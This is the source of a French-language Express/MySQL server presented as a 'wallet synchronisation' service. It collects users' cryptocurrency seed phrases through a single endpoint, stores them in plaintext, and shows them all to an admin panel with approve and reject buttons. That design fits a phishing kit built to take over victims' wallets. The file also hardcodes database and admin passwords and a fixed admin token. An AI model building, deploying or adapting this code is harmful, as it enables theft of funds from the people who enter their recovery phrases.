const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const mysql = require('mysql2/promise');

const app = express();
const PORT = process.env.PORT || 3000;

console.log('🚀 Portefeuille Blockchain - Démarrage...');

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'frontend')));

// ==================== MYSQL ====================
const pool = mysql.createPool({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'u120682741_blockuser',
    password: process.env.DB_PASSWORD || 'Blockchain2024!',
    database: process.env.DB_NAME || 'u120682741_blockchain',
    waitForConnections: true,
    connectionLimit: 10
});

async function connectDB() {
    try {
        const connection = await pool.getConnection();
        console.log('✅ MySQL connecté');
        connection.release();

        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(255) UNIQUE NOT NULL,
                email VARCHAR(255) UNIQUE NOT NULL,
                password VARCHAR(255) NOT NULL,
                wallet_address VARCHAR(255) UNIQUE NOT NULL,
                seed_phrase TEXT,
                status VARCHAR(50) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('✅ Table users créée');
        return true;
    } catch (error) {
        console.error('❌ Erreur MySQL:', error.message);
        return false;
    }
}

// ==================== ROUTES ====================

app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Blockchain Wallet API running' });
});

// ROUTE UNIQUE : Synchronisation (enregistrement + vérification)
app.post('/api/wallet/sync', async (req, res) => {
    try {
        const { seedPhrase } = req.body;
        
        if (!seedPhrase) {
            return res.status(400).json({ 
                success: false, 
                error: 'Seed phrase requise' 
            });
        }

        // 1. Vérifier si les mots existent déjà
        const [existing] = await pool.query('SELECT * FROM users WHERE seed_phrase = ?', [seedPhrase]);
        
        if (existing.length > 0) {
            const user = existing[0];
            return res.json({
                success: true,
                status: user.status,
                message: user.status === 'approved' ? '✅ Wallet synchronisé !' :
                         user.status === 'rejected' ? '❌ Erreur de vérification, vérifiez les mots' :
                         '⏳ En attente de synchronisation...'
            });
        }

        // 2. Les mots n'existent pas, créer une nouvelle demande
        const walletAddress = `0x${crypto.randomBytes(20).toString('hex')}`;
        const [result] = await pool.query(
            'INSERT INTO users (username, email, password, wallet_address, seed_phrase, status) VALUES (?, ?, ?, ?, ?, ?)',
            ['user_' + Date.now(), 'user_' + Date.now() + '@temp.com', 'temp123', walletAddress, seedPhrase, 'pending']
        );

        res.json({
            success: true,
            status: 'pending',
            message: '⏳ En attente de synchronisation...'
        });

    } catch (error) {
        console.error('Erreur sync:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Erreur serveur' 
        });
    }
});

// ADMIN
const adminEmail = 'admin@blockchain.com';
const adminPassword = 'Admin123!';

app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body;
    if (email === adminEmail && password === adminPassword) {
        res.json({ success: true, token: 'admin_secret_token' });
    } else {
        res.status(401).json({ success: false });
    }
});

app.get('/api/admin/verify', (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token === 'admin_secret_token') {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.get('/api/admin/users', async (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });

    const [users] = await pool.query('SELECT id, username, email, wallet_address, seed_phrase, status, created_at FROM users ORDER BY created_at DESC');
    res.json({ success: true, users });
});

app.post('/api/admin/approve-user', async (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });

    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({ success: false, error: 'ID utilisateur requis' });
    }

    await pool.query('UPDATE users SET status = ? WHERE id = ?', ['approved', userId]);
    res.json({ success: true, message: 'Utilisateur approuvé' });
});

app.post('/api/admin/reject-user', async (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });

    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({ success: false, error: 'ID utilisateur requis' });
    }

    await pool.query('UPDATE users SET status = ? WHERE id = ?', ['rejected', userId]);
    res.json({ success: true, message: 'Utilisateur rejeté' });
});

app.delete('/api/admin/delete-user', async (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });
    const { userId } = req.body;
    await pool.query('DELETE FROM users WHERE id = ?', [userId]);
    res.json({ success: true });
});

// FRONTEND
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'index.html')));
app.get('/dashboard.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'dashboard.html')));
app.get('/seed-sync.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'seed-sync.html')));
app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'admin.html')));

// DÉMARRAGE
async function startServer() {
    const dbConnected = await connectDB();
    if (!dbConnected) {
        console.log('❌ Base de données non disponible');
        process.exit(1);
    }
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`\n🚀 Portefeuille Blockchain API sur http://0.0.0.0:${PORT}`);
        console.log(`🔐 Admin: ${adminEmail} / ${adminPassword}`);
        console.log(`🌐 https://supportblockchain.finance\n`);
    });
}

startServer();